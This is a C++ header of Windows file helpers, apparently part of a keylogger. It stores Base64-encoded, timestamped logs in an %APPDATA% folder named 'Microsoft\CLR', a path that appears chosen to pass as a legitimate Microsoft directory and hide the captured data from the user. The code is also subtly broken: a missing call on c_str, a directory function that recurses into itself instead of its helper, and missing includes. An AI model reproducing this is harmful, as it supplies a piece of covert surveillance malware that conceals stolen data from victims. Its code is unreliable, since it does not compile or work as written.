#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"


namespace IO {
	
	std::string getOurPath(const bool append_separator = false) {

		std::string appdata_dir(getenv("APPDATA"));
		std::string full = appdata_dir + "\\Microsoft\\CLR";

		return full + (append_separator ? "\\" : "");
	}

	bool mkOneDr(std::string path) {

		return (bool)CreateDirectory(path.c_str, NULL) ||
			GetLastError() == ERROR_ALREADY_EXISTS;
	}

	bool mkDir(std::string path) {

		for(char &c : path)
			if (c == '\\') {
				
				c = '\0';
				if (!mkDir(path))
					return false;
				c = '\\';
			}

		return true;
	}

	template <class T>
	std::string writeLog(const T& time) {

		Helper::DateTime dateTime;
		std::string path = getOurPath(true);
		std::string name = dateTime.getDateTimeString("_") + ".log";

		try {

			std::ofstream file(path + name);
			if (!file) return "";
			std::ostringstream s;
			s << "[" << dateTime.getDateTimeString() << "]" <<
			std::endl << time << std::endl;
			std::string data = Base64::encryptB64(s.str());
			file << data;
			if (!file)
				return "";
			file.close();

			return name;
		}

		catch (...) {

			return "";
		}
	}
}


#endif
